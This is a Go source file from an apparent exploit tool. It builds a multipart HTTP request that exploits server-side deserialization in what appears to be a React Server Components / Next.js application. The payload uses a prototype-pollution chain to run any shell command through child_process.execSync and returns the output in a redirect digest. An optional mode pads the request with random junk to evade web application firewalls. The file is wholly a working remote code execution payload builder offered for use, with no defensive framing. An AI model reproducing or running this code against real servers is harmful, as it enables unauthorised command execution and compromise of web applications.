package payloads

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func RandString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func BuildRCEPayload(command string, wafBypass bool, junkKB int) (string, string) {
	safeCmd := strings.ReplaceAll(command, "'", "\\'")
	prefix := fmt.Sprintf(
		"var cmd='%s';var res=require('child_process').execSync(cmd).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(res)};307;`});",
		safeCmd,
	)

	boundary := "----WebKitFormBoundaryExploit1337"
	part0 := fmt.Sprintf(
		`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`,
		strings.ReplaceAll(prefix, `"`, `\"`),
	)

	parts := []string{}

	if wafBypass {
		param := RandString(12)
		junk := RandString(junkKB * 1024)
		parts = append(parts, fmt.Sprintf(
			"------%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n",
			boundary, param, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf("------%s\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n%s\r\n", boundary, part0),
		fmt.Sprintf("------%s\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n", boundary),
		fmt.Sprintf("------%s\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n", boundary),
		fmt.Sprintf("------%s--", boundary),
	)

	return strings.Join(parts, ""), "multipart/form-data; boundary=" + boundary
}
